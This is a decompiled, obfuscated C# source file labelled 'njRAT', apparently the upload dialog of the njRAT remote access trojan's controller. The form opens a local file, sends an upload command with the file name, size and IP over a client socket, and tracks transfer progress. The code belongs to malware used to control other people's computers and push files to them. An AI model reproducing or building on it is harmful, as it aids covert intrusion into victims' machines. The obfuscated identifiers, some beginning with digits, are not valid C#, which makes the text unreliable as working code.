using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace njRAT
{
	// Token: 0x0200004C RID: 76
	[DesignerGenerated]
	public partial class up : Form
	{
		// Token: 0x06000431 RID: 1073 RVA: 0x0002CF80 File Offset: 0x0002B180
		public up()
		{
			base.FormClosing += this.\u0002;
			base.Load += this.\u0002;
			this.Closing = false;
			this.os = 0;
			this.\u0002();
		}

		// Token: 0x06000433 RID: 1075 RVA: 0x0002D018 File Offset: 0x0002B218
		[DebuggerStepThrough]
		private void \u0002()
		{
			this.\u0002 = new Container();
			ListViewItem listViewItem = new ListViewItem(new string[]
			{
				\u0006\u2001.\u0002(-1829139097),
				string.Empty
			}, -1);
			ListViewItem listViewItem2 = new ListViewItem(new string[]
			{
				\u0006\u2001.\u0002(-1829139076),
				string.Empty
			}, -1);
			ListViewItem listViewItem3 = new ListViewItem(new string[]
			{
				\u0006\u2001.\u0002(-1829139087),
				string.Empty
			}, -1);
			ListViewItem listViewItem4 = new ListViewItem(new string[]
			{
				\u0006\u2001.\u0002(-1829118823),
				string.Empty
			}, -1);
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(up));
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002(new ProgressBar());
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002(new Button());
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002(new Timer(this.\u0002));
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002(new \u000F\u2000());
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002(new ColumnHeader());
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0003(new ColumnHeader());
			this.SuspendLayout();
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Bottom;
			Control control = this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002();
			Point location = new Point(0, 76);
			control.Location = location;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138855);
			Control control2 = this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002();
			Size size = new Size(579, 23);
			control2.Size = size;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().TabIndex = 0;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Right;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			Control control3 = this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002();
			location = new Point(504, 0);
			control3.Location = location;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829139756);
			Control control4 = this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002();
			size = new Size(75, 76);
			control4.Size = size;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().TabIndex = 1;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138787);
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().UseVisualStyleBackColor = false;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Interval = 1000;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().BorderStyle = BorderStyle.None;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Columns.AddRange(new ColumnHeader[]
			{
				this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002(),
				this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0003()
			});
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8f, FontStyle.Bold);
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().FullRowSelect = true;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().GridLines = true;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().HeaderStyle = ColumnHeaderStyle.None;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Items.AddRange(new ListViewItem[]
			{
				listViewItem,
				listViewItem2,
				listViewItem3,
				listViewItem4
			});
			Control control5 = this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 0);
			control5.Location = location;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829139116);
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().OwnerDraw = true;
			Control control6 = this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002();
			size = new Size(504, 76);
			control6.Size = size;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().TabIndex = 2;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().UseCompatibleStateImageBehavior = false;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().View = View.Details;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(579, 99);
			this.ClientSize = size;
			this.Controls.Add(this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002());
			this.Icon = (Icon)componentResourceManager.GetObject(\u0006\u2001.\u0002(-1829139480));
			this.Name = \u0006\u2001.\u0002(-1829137025);
			this.Text = \u0006\u2001.\u0002(-1829137025);
			this.ResumeLayout(false);
		}

		// Token: 0x06000434 RID: 1076 RVA: 0x0002D458 File Offset: 0x0002B658
		internal virtual ProgressBar 4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0003;
		}

		// Token: 0x06000435 RID: 1077 RVA: 0x0002D46C File Offset: 0x0002B66C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002(ProgressBar \u0002)
		{
			this.\u0003 = \u0002;
		}

		// Token: 0x06000436 RID: 1078 RVA: 0x0002D478 File Offset: 0x0002B678
		internal virtual Button 4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0005;
		}

		// Token: 0x06000437 RID: 1079 RVA: 0x0002D48C File Offset: 0x0002B68C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002(Button \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005);
			if (this.\u0005 != null)
			{
				this.\u0005.Click -= value;
			}
			this.\u0005 = \u0002;
			if (this.\u0005 != null)
			{
				this.\u0005.Click += value;
			}
		}

		// Token: 0x06000438 RID: 1080 RVA: 0x0002D4DC File Offset: 0x0002B6DC
		internal virtual Timer 4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0008;
		}

		// Token: 0x06000439 RID: 1081 RVA: 0x0002D4F0 File Offset: 0x0002B6F0
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002(Timer \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003);
			if (this.\u0008 != null)
			{
				this.\u0008.Tick -= value;
			}
			this.\u0008 = \u0002;
			if (this.\u0008 != null)
			{
				this.\u0008.Tick += value;
			}
		}

		// Token: 0x0600043A RID: 1082 RVA: 0x0002D540 File Offset: 0x0002B740
		internal virtual \u000F\u2000 4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0006;
		}

		// Token: 0x0600043B RID: 1083 RVA: 0x0002D554 File Offset: 0x0002B754
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002(\u000F\u2000 \u0002)
		{
			this.\u0006 = \u0002;
		}

		// Token: 0x0600043C RID: 1084 RVA: 0x0002D560 File Offset: 0x0002B760
		internal virtual ColumnHeader 4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u000E;
		}

		// Token: 0x0600043D RID: 1085 RVA: 0x0002D574 File Offset: 0x0002B774
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002(ColumnHeader \u0002)
		{
			this.\u000E = \u0002;
		}

		// Token: 0x0600043E RID: 1086 RVA: 0x0002D580 File Offset: 0x0002B780
		internal virtual ColumnHeader 4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u000F;
		}

		// Token: 0x0600043F RID: 1087 RVA: 0x0002D594 File Offset: 0x0002B794
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0003(ColumnHeader \u0002)
		{
			this.\u000F = \u0002;
		}

		// Token: 0x06000440 RID: 1088 RVA: 0x0002D5A0 File Offset: 0x0002B7A0
		private void \u0002(object \u0002, FormClosingEventArgs \u0003)
		{
			this.Closing = true;
			try
			{
				this.FS.Close();
				this.FS.Dispose();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.sk.Close();
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x06000441 RID: 1089 RVA: 0x0002D620 File Offset: 0x0002B820
		private void \u0002(object \u0002, EventArgs \u0003)
		{
			this.FS = new FileStream(this.TMP, FileMode.Open);
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Items[0].SubItems[1].Text = new FileInfo(this.TMP).Name;
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Items[1].SubItems[1].Text = global::\u000E.\u0002((long)this.SZ);
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Items[2].SubItems[1].Text = global::\u000E.\u0002(0L);
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Items[3].SubItems[1].Text = global::\u000E.\u0002(0L);
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Maximum = this.SZ;
			this.osk.Send(string.Concat(new string[]
			{
				\u0006\u2001.\u0002(-1829128217),
				\u000E\u2000.\u000E,
				\u0006\u2001.\u0002(-1829129203),
				\u000E\u2000.\u000E,
				\u0006\u2001.\u0002(-1829137025),
				\u000E\u2000.\u000E,
				this.osk.ip(),
				\u000E\u2000.\u000E,
				global::\u000E.\u0002(ref this.FN),
				\u000E\u2000.\u000E,
				Conversions.ToString(this.SZ)
			}));
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().\u0005();
			this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Enabled = true;
		}

		// Token: 0x06000442 RID: 1090 RVA: 0x0002D7AC File Offset: 0x0002B9AC
		private void \u0003(object \u0002, EventArgs \u0003)
		{
			try
			{
				this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Items[2].SubItems[1].Text = global::\u000E.\u0002((long)(checked(this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Value - this.os)));
				this.os = this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Value;
				this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Items[3].SubItems[1].Text = global::\u000E.\u0002((long)this.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().Value);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000443 RID: 1091 RVA: 0x0002D85C File Offset: 0x0002BA5C
		private void \u0005(object \u0002, EventArgs \u0003)
		{
			this.Close();
		}

		// Token: 0x04000277 RID: 631
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar \u0003;

		// Token: 0x04000278 RID: 632
		[AccessedThroughProperty("Button1")]
		private Button \u0005;

		// Token: 0x04000279 RID: 633
		[AccessedThroughProperty("Timer1")]
		private Timer \u0008;

		// Token: 0x0400027A RID: 634
		[AccessedThroughProperty("Lv1")]
		private \u000F\u2000 \u0006;

		// Token: 0x0400027B RID: 635
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader \u000E;

		// Token: 0x0400027C RID: 636
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader \u000F;

		// Token: 0x0400027D RID: 637
		public FileStream FS;

		// Token: 0x0400027E RID: 638
		public string FN;

		// Token: 0x0400027F RID: 639
		public string TMP;

		// Token: 0x04000280 RID: 640
		public int SZ;

		// Token: 0x04000281 RID: 641
		public Client sk;

		// Token: 0x04000282 RID: 642
		public Client osk;

		// Token: 0x04000283 RID: 643
		public new bool Closing;

		// Token: 0x04000284 RID: 644
		public int os;
	}
}
